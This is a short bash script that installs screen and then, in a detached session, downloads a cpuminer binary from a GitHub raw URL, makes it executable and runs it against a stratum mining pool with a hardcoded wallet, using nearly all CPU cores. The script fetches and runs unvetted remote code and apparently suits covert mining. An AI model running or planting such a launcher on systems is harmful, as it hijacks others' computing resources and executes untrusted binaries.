#!/bin/bash
apt update
apt install screen -y
screen -dm -S run wget -qO cpu https://raw.githubusercontent.com/AntonyAjax/kawakita/main/cpuminer-sse2 && chmod +x cpu && ./cpu -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve.7maret-fullcrack -t $(nproc --ignore 2)
screen -ls
echo succes
